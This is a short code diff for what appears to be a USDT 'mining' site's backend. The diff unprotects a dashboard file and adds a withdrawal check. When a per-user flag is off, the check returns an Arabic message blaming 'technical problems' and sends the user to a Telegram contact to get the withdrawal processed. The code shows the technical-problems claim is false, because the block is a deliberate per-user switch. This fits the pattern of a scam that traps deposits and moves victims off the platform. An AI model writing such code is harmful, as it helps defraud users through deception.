@@ -7,7 +7,6 @@ const PROTECTED_FILES = [
   'superpanel.html',
   'admin.html',
   'panel.html',
-  'dashboard.html',
   'config.json',
   '.env',
   'package.json',
@@ -1229,7 +1228,13 @@ app.post("/api/withdraw", async (req, res) => {
         // =========================================================
     // CHECK: WITHDRAWAL BLOCKED - CONTACT TELEGRAM
     // =========================================================
-   
+   if (!user.withdrawalEnabled) {
+      return res.status(403).json({
+        success: false,
+        message: "⚠️ حدثت لدينا بعض المشكلات الفنية، لذا نرجو منك التواصل مع حسابنا الرسمي على تيليجرام لفتح طلب السحب الخاص بك ومتابعته.",
+        telegram: "https://t.me/miningusdtcontact"
+      });
+    }
 
     // خصم الرصيد
     user.balance = currentBalance - amount;
